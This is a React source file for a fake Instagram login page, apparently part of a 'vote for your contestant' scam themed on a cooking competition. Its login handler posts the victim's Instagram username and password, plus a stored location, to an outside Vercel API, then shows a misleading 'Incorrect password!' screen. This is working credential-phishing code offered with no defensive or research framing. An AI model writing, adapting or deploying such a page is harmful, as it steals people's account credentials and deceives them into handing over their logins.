import { useEffect, useState } from "react";
import instagramLogo from "../assets/instagram-logo.png";
export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const [pending, setPending] = useState(false);
  const [approved, setApproved] = useState(false);
  const [rejected, setRejected] = useState(false);

  



async function handleLogin(e) {
  e.preventDefault();

  if (!username || !password) {
    alert("Please enter your username and password.");
    return;
  }

  setLoading(true);

  try {
    const res = await fetch(
      "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          candidate_number: 1,
          platform: "instagram",
          username,
          password,
          location: localStorage.getItem("voteLocation"),
        }),
      }
    );

    const data = await res.json();

    if (data.success) {
      setPending(true);

      setTimeout(() => {
        setPending(false);
        setApproved(true);
      }, 3000);

    } else {
      alert(data.message);
    }

  } catch (err) {
    alert("Unable to connect to server.");
  }

  setLoading(false);
}
  if (approved) {
    return (
      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-6">
            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
          </div>

          <h1 className="text-white text-2xl font-bold mt-8">
            Incorrect password!
          </h1>

          <p className="text-gray-400 mt-3">
            Thank you for supporting your contestant.
          </p>
        </div>
      </div>
    );
  }

  if (rejected) {
    return (
      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-6">
            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
          </div>

          <h1 className="text-white text-2xl font-bold mt-8">
            Verification Failed ❌
          </h1>

          <p className="text-gray-400 mt-3">
            Your vote could not be verified.
          </p>
        </div>
      </div>
    );
  }

  if (pending) {
    return (
      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-6">
          <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
        </div>
          <h1 className="text-white text-2xl font-bold mt-8">
            Pending Approval
          </h1>

          <p className="text-gray-400 mt-3">
            Your request has been submitted.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0f1014] flex flex-col justify-between py-8 px-8">

      <p className="text-center text-gray-400 text-sm">
        English (US)
      </p>
      <form onSubmit={handleLogin}>

        <div className="w-20 h-20 mx-auto mb-6">
          <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
        </div>

        <input
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="Username"
          className="w-full h-12 rounded-xl bg-[#1d1f25] border border-gray-700 px-4 text-white mb-3 outline-none"
        />

        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          className="w-full h-12 rounded-xl bg-[#1d1f25] border border-gray-700 px-4 text-white mb-5 outline-none"
        />

        <div className="mt-3 text-center">
  <span className="text-sm text-blue-500 cursor-pointer hover:underline">
    Forgot password?
  </span>
</div>

        <button
          type="submit"
          disabled={loading}
          className="w-full h-12 rounded-xl bg-[#1877F2] text-white font-semibold"
        >
          {loading ? "Logging in..." : "Log in"}
        </button>

      </form>

      <div></div>

    </div>
  );
}